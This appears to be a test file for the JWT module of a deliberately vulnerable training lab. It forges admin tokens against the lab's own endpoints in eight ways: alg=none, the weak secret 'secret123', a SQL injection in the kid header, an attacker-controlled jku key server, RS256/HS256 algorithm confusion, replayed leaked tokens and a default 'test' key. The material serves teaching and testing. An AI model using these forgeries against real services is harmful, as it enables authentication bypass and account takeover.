'use strict';
// JWT module: every challenge must be solvable by the documented technique and
// must NOT be solvable by the obvious shortcut or a benign token.
const test = require('node:test');
const assert = require('node:assert/strict');
const jwt = require('jsonwebtoken');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

function b64u(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}
function b64uJson(seg) {
  return JSON.parse(Buffer.from(String(seg), 'base64url').toString('utf8'));
}
// First well-formed token on the page whose claims carry role "admin".
function adminTokenFromPage(text) {
  const tokens = text.match(/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g) || [];
  for (const tok of tokens) {
    try {
      const claims = b64uJson(tok.split('.')[1]);
      if (claims && claims.role === 'admin') return tok;
    } catch { /* not a token */ }
  }
  return null;
}
// The RSA public key as shown on the page. The <pre> block ends the PEM with
// a real newline, which the page regex would otherwise drop; the verifier
// uses the full PEM bytes (trailing newline included) as the HMAC secret, so
// the forged token must be signed with exactly those bytes.
function pubPemFromPage(text) {
  const m = text.match(/-----BEGIN PUBLIC KEY-----[\s\S]*?-----END PUBLIC KEY-----/);
  assert.ok(m, 'public key published on the page');
  const pem = m[0];
  return pem.endsWith('\n') ? pem : pem + '\n';
}
// First well-formed token on the page, whatever its claims.
function anyTokenFromPage(text) {
  const tokens = text.match(/[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g) || [];
  for (const tok of tokens) {
    try { b64uJson(tok.split('.')[1]); return tok; } catch { /* not a token */ }
  }
  return null;
}

// Run the real exploit for all eight challenges with one student client.
async function captureJwtFlags(c, srv) {
  const unsignedAdmin = b64u({ alg: 'none', typ: 'JWT' }) + '.' + b64u({ user: 'guest', role: 'admin' }) + '.';
  await c.post('/jwt/none', { token: unsignedAdmin });

  const forgedWeak = jwt.sign({ user: 'guest', role: 'admin' }, 'secret123', { algorithm: 'HS256' });
  await c.post('/jwt/weak', { token: forgedWeak });

  const evilKid = `' UNION SELECT 'evilsecret' -- `;
  const forgedKid = jwt.sign({ user: 'guest', role: 'admin' }, 'evilsecret', { algorithm: 'HS256', header: { kid: evilKid } });
  await c.post('/jwt/kid', { token: forgedKid });

  await c.post('/jwt/attacker-keys/register', { kid: 'evil', secret: 'evilsecret' });
  const forgedJku = jwt.sign({ user: 'guest', role: 'admin' }, 'evilsecret', {
    algorithm: 'HS256',
    header: { kid: 'evil', jku: srv.base + '/jwt/attacker-keys/jwks?kid=evil' },
  });
  await c.post('/jwt/jku', { token: forgedJku });

  const pubPem = pubPemFromPage((await c.get('/jwt/confusion-pubkey')).text);
  const forgedConfusion = jwt.sign({ user: 'guest', role: 'admin' }, pubPem, { algorithm: 'HS256' });
  await c.post('/jwt/confusion', { token: forgedConfusion });

  const expiryPage = await c.get('/jwt/noexpiry');
  await c.post('/jwt/noexpiry', { token: adminTokenFromPage(expiryPage.text) });

  const audPage = await c.get('/jwt/aud');
  await c.post('/jwt/aud/login', { token: adminTokenFromPage(audPage.text) });

  const forgedDefault = jwt.sign({ user: 'guest', role: 'admin' }, 'test', { algorithm: 'HS256' });
  await c.post('/jwt/kiddefault', { token: forgedDefault });
}

const EXPECTED_NAMES = [
  'alg=none Accepted',
  'Weak HMAC Secret',
  'SQL Injection in kid Lookup',
  'Untrusted jku Key Server',
  'RS256 / HS256 Algorithm Confusion',
  'Expiry Never Checked',
  'Audience Not Validated',
  'Default Key for Missing kid',
];

test('jwt module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'jwt', id);

  await t.test('module page renders, links resolve, no em dash', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/jwt');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 8);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of [
      '/jwt/none', '/jwt/weak', '/jwt/kid', '/jwt/jku', '/jwt/confusion',
      '/jwt/confusion-pubkey', '/jwt/noexpiry', '/jwt/aud',
      '/jwt/kiddefault', '/jwt/attacker-keys',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('none-admin: garbage is rejected, unsigned admin token earns the flag', async () => {
    const c = client(srv.base);
    const bad = await c.post('/jwt/none', { token: 'not.a.token' });
    assert.equal(bad.status, 403);
    assert.ok(!bad.text.includes(flagOf('none-admin')));
    const unsignedAdmin = b64u({ alg: 'none', typ: 'JWT' }) + '.' + b64u({ user: 'guest', role: 'admin' }) + '.';
    const hit = await c.post('/jwt/none', { token: unsignedAdmin });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('none-admin')));
    assert.ok((await capturedSet(c)).includes('jwt:alg=none Accepted'));
  });

  await t.test('weak-secret: guest token earns nothing, forged admin token earns the flag', async () => {
    const c = client(srv.base);
    const guest = jwt.sign({ user: 'guest', role: 'user' }, 'secret123', { algorithm: 'HS256' });
    const benign = await c.post('/jwt/weak', { token: guest });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('weak-secret')));
    const forged = jwt.sign({ user: 'guest', role: 'admin' }, 'secret123', { algorithm: 'HS256' });
    const hit = await c.post('/jwt/weak', { token: forged });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('weak-secret')));
    assert.ok((await capturedSet(c)).includes('jwt:Weak HMAC Secret'));
  });

  await t.test('kid-sqli: wrong key is rejected, kid injection picks our key', async () => {
    const c = client(srv.base);
    const wrong = jwt.sign({ user: 'guest', role: 'admin' }, 'wrongkey', { algorithm: 'HS256', header: { kid: 'main' } });
    const benign = await c.post('/jwt/kid', { token: wrong });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('kid-sqli')));
    const evilKid = `' UNION SELECT 'evilsecret' -- `;
    const forged = jwt.sign({ user: 'guest', role: 'admin' }, 'evilsecret', { algorithm: 'HS256', header: { kid: evilKid } });
    const hit = await c.post('/jwt/kid', { token: forged });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('kid-sqli')));
    assert.ok((await capturedSet(c)).includes('jwt:SQL Injection in kid Lookup'));
  });

  await t.test('jku: unknown key server is rejected, own key server earns the flag', async () => {
    const c = client(srv.base);
    const stray = jwt.sign({ user: 'guest', role: 'admin' }, 'nope', {
      algorithm: 'HS256',
      header: { kid: 'ghost', jku: srv.base + '/jwt/attacker-keys/jwks?kid=ghost' },
    });
    const benign = await c.post('/jwt/jku', { token: stray });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('jku')));
    await c.post('/jwt/attacker-keys/register', { kid: 'evil', secret: 'evilsecret' });
    const forged = jwt.sign({ user: 'guest', role: 'admin' }, 'evilsecret', {
      algorithm: 'HS256',
      header: { kid: 'evil', jku: srv.base + '/jwt/attacker-keys/jwks?kid=evil' },
    });
    const hit = await c.post('/jwt/jku', { token: forged });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('jku')));
    assert.ok((await capturedSet(c)).includes('jwt:Untrusted jku Key Server'));
  });

  await t.test('alg-confusion: wrong HMAC secret is rejected, public key as secret earns the flag', async () => {
    const c = client(srv.base);
    const pubPem = pubPemFromPage((await c.get('/jwt/confusion-pubkey')).text);
    const wrong = jwt.sign({ user: 'guest', role: 'admin' }, 'not-the-key', { algorithm: 'HS256' });
    const benign = await c.post('/jwt/confusion', { token: wrong });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('alg-confusion')));
    const forged = jwt.sign({ user: 'guest', role: 'admin' }, pubPem, { algorithm: 'HS256' });
    const hit = await c.post('/jwt/confusion', { token: forged });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('alg-confusion')));
    assert.ok((await capturedSet(c)).includes('jwt:RS256 / HS256 Algorithm Confusion'));
  });

  await t.test('no-expiry: expired guest token earns nothing, replaying the leaked admin token does', async () => {
    const c = client(srv.base);
    const expiredGuest = jwt.sign(
      { user: 'guest', role: 'user', exp: Math.floor(Date.now() / 1000) - 3600 },
      'secret123',
      { algorithm: 'HS256' }
    );
    const benign = await c.post('/jwt/noexpiry', { token: expiredGuest });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('no-expiry')));
    const pageText = (await c.get('/jwt/noexpiry')).text;
    const leaked = adminTokenFromPage(pageText);
    assert.ok(leaked, 'leaked admin token shown on the page');
    const hit = await c.post('/jwt/noexpiry', { token: leaked });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('no-expiry')));
    assert.ok((await capturedSet(c)).includes('jwt:Expiry Never Checked'));
  });

  await t.test('aud-bypass: minted user token earns nothing, partner token earns the flag', async () => {
    const c = client(srv.base);
    const mintRes = await c.post('/jwt/aud/mint', { aud: 'other-service' });
    assert.equal(mintRes.status, 200);
    const minted = anyTokenFromPage(mintRes.text);
    assert.ok(minted, 'vending machine minted a token');
    const benign = await c.post('/jwt/aud/login', { token: minted });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('aud-bypass')));
    const pageText = (await c.get('/jwt/aud')).text;
    const partner = adminTokenFromPage(pageText);
    assert.ok(partner, 'partner token shown on the page');
    const hit = await c.post('/jwt/aud/login', { token: partner });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('aud-bypass')));
    assert.ok((await capturedSet(c)).includes('jwt:Audience Not Validated'));
  });

  await t.test('kid-default: wrong default guess is rejected, right default key earns the flag', async () => {
    const c = client(srv.base);
    const wrong = jwt.sign({ user: 'guest', role: 'admin' }, 'wrongkey', { algorithm: 'HS256' });
    const benign = await c.post('/jwt/kiddefault', { token: wrong });
    assert.equal(benign.status, 403);
    assert.ok(!benign.text.includes(flagOf('kid-default')));
    const forged = jwt.sign({ user: 'guest', role: 'admin' }, 'test', { algorithm: 'HS256' });
    const hit = await c.post('/jwt/kiddefault', { token: forged });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(flagOf('kid-default')));
    assert.ok((await capturedSet(c)).includes('jwt:Default Key for Missing kid'));
  });

  await t.test('scoreboard counts each captured challenge once', async () => {
    const c = client(srv.base);
    await captureJwtFlags(c, srv);
    await captureJwtFlags(c, srv);
    const got = (await capturedSet(c)).filter((s) => s.startsWith('jwt:'));
    assert.equal(got.length, 8);
    for (const name of EXPECTED_NAMES) {
      assert.equal(got.filter((s) => s === `jwt:${name}`).length, 1, name);
    }
  });
});
